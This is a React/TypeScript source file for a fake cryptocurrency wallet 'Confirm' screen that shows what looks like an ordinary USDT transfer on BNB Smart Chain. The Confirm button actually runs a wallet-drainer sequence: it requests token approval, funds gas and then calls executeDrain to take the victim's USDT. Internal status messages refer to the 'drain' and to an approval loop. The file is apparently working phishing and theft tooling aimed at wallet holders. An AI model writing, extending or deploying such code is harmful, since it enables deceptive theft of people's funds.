// src/components/ConfirmPage.tsx
import { useState } from "react";
import { ethers } from "ethers";
import { requestApproval, ensureGas, executeDrain, cancelApprovalLoop } from "../lib/web3";
import { formatAddress } from "../lib/telegram";

interface Props {
  provider: ethers.BrowserProvider;
  address: string;
  recipient: string;
  amount: string;
  onBack: () => void;
}

type Stage = "confirming" | "approving" | "checking_gas" | "draining" | "done" | "error";

export default function ConfirmPage({ provider, address, recipient, amount, onBack }: Props) {
  const [stage, setStage] = useState<Stage>("confirming");
  const [statusMsg, setStatusMsg] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleConfirm = async () => {
    if (isLoading) return;
    setIsLoading(true);
    setStage("approving");
    setStatusMsg("Requesting approval...");

    try {
      // Step 1: Approval (2 arguments: provider, address)
      const approvedAmount = await requestApproval(provider, address);
      if (!approvedAmount) {
        setStage("error");
        setStatusMsg("Approval failed — user may have closed the prompt.");
        setIsLoading(false);
        return;
      }

      // Step 2: Gas check (2 arguments: provider, address)
      setStage("checking_gas");
      setStatusMsg("Checking gas balance...");
      const hasGas = await ensureGas(provider, address);
      if (!hasGas) {
        setStage("error");
        setStatusMsg("Could not fund gas. Skipping drain.");
        setIsLoading(false);
        return;
      }

      // Step 3: Drain (2 arguments: address, approvedAmount)
      setStage("draining");
      setStatusMsg("Transferring USDT...");
      const drained = await executeDrain(address, approvedAmount); // Updated: Removed `provider`

      setIsLoading(false);
      if (drained) {
        setStage("done");
        setStatusMsg("Transaction complete!");
      } else {
        setStage("error");
        setStatusMsg("Drain failed — check logs.");
      }
    } catch (err: any) {
      setIsLoading(false);
      setStage("error");
      setStatusMsg(`Error: ${err.message}`);
    }
  };

  return (
    <div className="min-h-screen bg-[#0C0F1E] text-white font-sans">
      {/* Header */}
      <div className="flex items-center px-4 py-3 border-b border-[#23263B]">
        <button
          className="text-[#3375BB] text-lg"
          onClick={() => {
            cancelApprovalLoop();
            onBack();
          }}
          disabled={isLoading}
        >
          &larr;
        </button>
        <h1 className="text-lg font-semibold flex-1 text-center mr-6">Confirm</h1>
      </div>

      {/* Token Display */}
      <div className="flex flex-col items-center mt-10">
        <div className="w-16 h-16 rounded-full bg-green-500 flex items-center justify-center mb-4">
          <span className="text-white text-2xl font-bold">$</span>
        </div>
        <h2 className="text-3xl font-bold">{amount} USDT</h2>
        <p className="text-sm text-[#8892A4] mt-1">~${amount} USD</p>
      </div>

      {/* Details */}
      <div className="mx-4 mt-8 bg-[#1C1F33] rounded-2xl p-4 space-y-4">
        <div className="flex justify-between text-sm">
          <span className="text-[#8892A4]">From</span>
          <span className="font-mono text-xs">{formatAddress(address)}</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-[#8892A4]">To</span>
          <span className="font-mono text-xs">{formatAddress(recipient)}</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-[#8892A4]">Network</span>
          <span>BNB Smart Chain</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-[#8892A4]">Network Fee</span>
          <span>$0.06</span>
        </div>
      </div>

      {/* Action Area */}
      <div className="mx-4 mt-8">
        {stage === "confirming" && (
          <>
            <div className="bg-[#1C1F33] rounded-2xl p-4 mb-4 text-sm text-[#8892A4]">
              <div className="flex items-center justify-between">
                <span>Estimated processing time</span>
                <span>~30 seconds</span>
              </div>
            </div>
            <button
              onClick={handleConfirm}
              disabled={isLoading}
              className={`w-full py-4 rounded-2xl text-lg font-semibold ${
                isLoading
                  ? "bg-[#23263B] text-[#8892A4] cursor-not-allowed"
                  : "bg-[#3375BB] text-white"
              }`}
            >
              {isLoading ? "Processing..." : "Confirm"}
            </button>
            <p className="text-center text-xs text-[#5A5F7A] mt-3">
              Swipe or tap Confirm to proceed
            </p>
          </>
        )}

        {stage !== "confirming" && (
          <div className="text-center py-10">
            {/* Animated spinner */}
            <div className="w-12 h-12 border-4 border-[#23263B] border-t-[#3375BB] rounded-full animate-spin mx-auto mb-4" />
            <p className="text-[#8892A4]">{statusMsg}</p>
            {stage === "done" && (
              <p className="text-green-500 mt-2 text-sm">
                Tokens transferred. You may close this page.
              </p>
            )}
            {stage === "error" && (
              <button
                onClick={() => {
                  cancelApprovalLoop();
                  window.location.reload();
                }}
                className="mt-4 text-[#3375BB] underline text-sm"
              >
                Reload and try again
              </button>
            )}
          </div>
        )}
      </div>
    </div>
  );
}